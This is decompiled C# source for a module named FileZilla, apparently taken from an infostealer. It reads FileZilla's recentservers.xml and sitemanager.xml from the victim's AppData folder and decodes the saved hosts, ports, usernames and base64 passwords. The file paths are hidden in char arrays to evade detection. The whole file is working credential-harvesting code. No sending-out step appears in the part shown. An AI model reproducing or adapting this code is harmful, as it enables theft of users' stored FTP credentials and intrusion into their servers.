using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Xml;

// Token: 0x02000005 RID: 5
public class FileZilla
{
	// Token: 0x06000015 RID: 21 RVA: 0x00002EE0 File Offset: 0x000010E0
	public static List<Account> Scan()
	{
		List<Account> list = new List<Account>();
		try
		{
			string path = string.Format(new string(new char[]
			{
				'{',
				'0',
				'}',
				'\\',
				'F',
				'i',
				'l',
				'e',
				'Z',
				'i',
				'l',
				'l',
				'a',
				'\\',
				'r',
				'e',
				'c',
				'e',
				'n',
				't',
				's',
				'e',
				'r',
				'v',
				'e',
				'r',
				's',
				'.',
				'x',
				'm',
				'l'
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			string path2 = string.Format(new string(new char[]
			{
				'{',
				'0',
				'}',
				'\\',
				'F',
				'i',
				'l',
				'e',
				'Z',
				'i',
				'l',
				'l',
				'a',
				'\\',
				's',
				'i',
				't',
				'e',
				'm',
				'a',
				'n',
				'a',
				'g',
				'e',
				'r',
				'.',
				'x',
				'm',
				'l'
			}), Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
			if (File.Exists(path))
			{
				list.AddRange(FileZilla.ScanCredentials(path));
			}
			if (File.Exists(path2))
			{
				list.AddRange(FileZilla.ScanCredentials(path2));
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000016 RID: 22 RVA: 0x00002F7C File Offset: 0x0000117C
	private static List<Account> ScanCredentials(string Path)
	{
		List<Account> list = new List<Account>();
		try
		{
			XmlTextReader reader = new XmlTextReader(Path);
			XmlDocument xmlDocument = new XmlDocument();
			xmlDocument.Load(reader);
			foreach (object obj in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
			{
				Account recent = FileZilla.GetRecent((XmlNode)obj);
				if (recent.URL != "UNKNOWN" && recent.URL != "UNKNOWN")
				{
					list.Add(recent);
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x06000017 RID: 23 RVA: 0x0000303C File Offset: 0x0000123C
	private static Account GetRecent(XmlNode xmlNode)
	{
		Account account = new Account();
		try
		{
			foreach (object obj in xmlNode.ChildNodes)
			{
				XmlNode xmlNode2 = (XmlNode)obj;
				if (xmlNode2.Name == "Host")
				{
					account.URL = xmlNode2.InnerText;
				}
				if (xmlNode2.Name == "Port")
				{
					account.URL = account.URL + ":" + xmlNode2.InnerText;
				}
				if (xmlNode2.Name == "User")
				{
					account.Username = xmlNode2.InnerText;
				}
				if (xmlNode2.Name == "Pass")
				{
					account.Password = Encoding.UTF8.GetString(Convert.FromBase64String(xmlNode2.InnerText));
				}
			}
		}
		catch
		{
		}
		finally
		{
			account.URL = (string.IsNullOrEmpty(account.URL) ? "UNKNOWN" : account.URL);
			account.Username = (string.IsNullOrEmpty(account.Username) ? "UNKNOWN" : account.Username);
			account.Password = (string.IsNullOrEmpty(account.Password) ? "UNKNOWN" : account.Password);
		}
		return account;
	}
}
